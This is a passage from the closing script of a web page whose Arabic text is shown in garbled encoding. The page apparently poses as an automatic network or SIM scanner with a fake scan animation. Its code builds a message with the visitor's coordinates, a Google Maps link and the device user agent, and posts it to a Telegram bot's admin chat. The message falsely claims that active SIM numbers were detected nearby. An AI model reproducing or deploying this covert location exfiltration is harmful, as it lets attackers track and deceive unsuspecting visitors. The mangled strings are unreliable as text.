      const msg = `üì° <b>ÿ™ŸÖ ÿ™ŸÜŸÅŸäÿ∞ ŸÖÿ≥ÿ≠ ÿ¥ÿ®ŸÉÿ© ÿ¨ÿØŸäÿØ</b>\n\nüë§ <b>ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ:</b> ${TELEGRAM_USERNAME}\nüìç <b>ÿßŸÑŸÖŸàŸÇÿπ:</b> https://maps.google.com/?q=${lat},${lon}\nüåç <b>ÿßŸÑÿ•ÿ≠ÿØÿßÿ´Ÿäÿßÿ™:</b> ${lat.toFixed(6)}, ${lon.toFixed(6)}\nüì± <b>ÿ¨Ÿáÿßÿ≤:</b> ${agent}\nüïí <b>ÿßŸÑŸàŸÇÿ™:</b> ${new Date().toLocaleString('ar-YE')}\n\n<i>ÿ™ŸÖ ÿßŸÑŸÉÿ¥ŸÅ ÿπŸÜ ÿ£ÿ±ŸÇÿßŸÖ SIM ŸÜÿ¥ÿ∑ÿ© ŸÅŸä ÿßŸÑŸÖŸÜÿ∑ŸÇÿ©</i>`;
      
      fetch(TELEGRAM_API_URL, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          chat_id: TELEGRAM_ADMIN_ID,
          text: msg,
          parse_mode: "HTML"
        }),
      }).then(res => {
        if (!res.ok) {
          console.error("ŸÅÿ¥ŸÑ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿ•ŸÑŸâ ÿßŸÑÿ™ŸÑŸäÿ¨ÿ±ÿßŸÖ");
        }
      }).catch(err => {
        console.error("ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿßÿ™ÿµÿßŸÑ:", err);
      });
    }

    // ÿ®ÿØÿ° ÿßŸÑŸÖÿ≥ÿ≠ ÿ™ŸÑŸÇÿßÿ¶ŸäŸãÿß ÿπŸÜÿØ ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿµŸÅÿ≠ÿ©
    window.addEventListener('DOMContentLoaded', () => {
      createParticles();
      
      setTimeout(() => {
        scanStatus.textContent = "üöÄ ÿ®ÿØÿ° ÿ™ÿ¥ÿ∫ŸäŸÑ ŸÜÿ∏ÿßŸÖ ÿßŸÑŸÖÿ≥ÿ≠ ÿßŸÑŸÖÿ™ŸÇÿØŸÖ...";
        setTimeout(simulateScan, 1500);
      }, 500);
    });
  </script>
</body>
</html>